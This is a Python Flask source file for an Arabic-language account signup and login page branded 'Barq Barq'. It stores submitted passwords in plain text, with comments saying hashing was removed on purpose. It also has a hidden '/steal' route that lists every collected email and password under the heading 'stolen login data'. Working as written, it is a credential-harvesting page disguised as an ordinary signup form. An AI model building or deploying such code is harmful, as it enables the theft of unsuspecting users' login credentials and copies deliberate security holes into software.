from flask import Flask, request, render_template_string
from markupsafe import escape
import re
import secrets
from threading import Lock

app = Flask(__name__)

# بيانات تجريبية محفوظة في الذاكرة (تم إزالة التجزئة لعرض كلمة المرور النصية)
accounts = {}
results = []
lock = Lock()

PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>انشا حساب برق برق</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f1f3f6;
            margin: 0;
            padding: 40px 15px;
        }
        .container {
            max-width: 420px;
            margin: auto;
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 16px #0001;
        }
        h2 { text-align: center; }
        input, button {
            box-sizing: border-box;
            width: 100%;
            padding: 12px;
            margin-top: 12px;
            border-radius: 6px;
            font-size: 16px;
        }
        input { border: 1px solid #ccc; }
        button {
            border: 0;
            background: #1769e0;
            color: white;
            cursor: pointer;
        }
        button:last-of-type { background: #198754; }
        .message {
            margin-top: 15px;
            padding: 10px;
            background: #eef4ff;
            border-radius: 6px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>انشا حساب برق برق</h2>
        <form method="post">
            <input type="email" name="email"
                   placeholder="البريد الإلكتروني"
                   required maxlength="254">

            <input type="password" name="password"
                   placeholder="كلمة المرور"
                   required minlength="12" maxlength="128">

            <button type="submit" name="action" value="register">
                إنشاء حساب
            </button>

            <button type="submit" name="action" value="login">
                تسجيل الدخول
            </button>
        </form>

        {% if message %}
            <div class="message">{{ message }}</div>
        {% endif %}
        
    </div>
</body>
</html>
"""


def valid_email(email):
    return bool(
        re.fullmatch(r"[^@\s]+@[^@\s]+\.[^@\s]+", email)
    )


@app.route("/", methods=["GET", "POST"])
def home():
    message = ""

    if request.method == "POST":
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")
        action = request.form.get("action", "")

        if not valid_email(email):
            message = "يرجى إدخال بريد إلكتروني صحيح."

        elif not 12 <= len(password) <= 128:
            message = "يجب أن تكون كلمة المرور بين 12 و128 حرفًا."

        elif action == "register":
            with lock:
                if email in accounts:
                    message = "هذا الحساب موجود بالفعل."
                else:
                    # تم حفظ كلمة المرور نصية مباشرة
                    accounts[email] = password
                    message = "تم إنشاء حساب برق برق بنجاح"

        elif action == "login":
            with lock:
                stored_password = accounts.get(email)
                authenticated = (
                    stored_password is not None
                    and stored_password == password
                )

            if authenticated:
                message = "تم تسجيل الدخول بنجاح."
            else:
                message = "البريد الإلكتروني أو كلمة المرور غير صحيحة."

        else:
            message = "العملية غير معروفة."

    return render_template_string(PAGE, message=message)


@app.route("/steal")
def show_credentials():
    # عرض الأيميل وكلمة السر النصية في رابط فرعي
    with lock:
        snapshot = list(accounts.items())

    rows = "".join(
        "<tr><td>" + str(escape(email)) +
        "</td><td>" + str(escape(password)) +  # عرض كلمة السر مباشرة
        "</td></tr>"
        for email, password in snapshot
    )

    return (
        "<!doctype html><html lang='ar' dir='rtl'>"
        "<meta charset='utf-8'>"
        "<title>قاعدة بيانات المستخدمين</title>"
        "<h2>بيانات الدخول المسروقة</h2>"
        "<table border='1' cellpadding='8'>"
        "<tr><th>البريد الإلكتروني</th>"
        "<th>كلمة المرور</th></tr>"
        + rows +
        "</table>"
        "<a href='/'>العودة</a></html>"
    )


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=False)


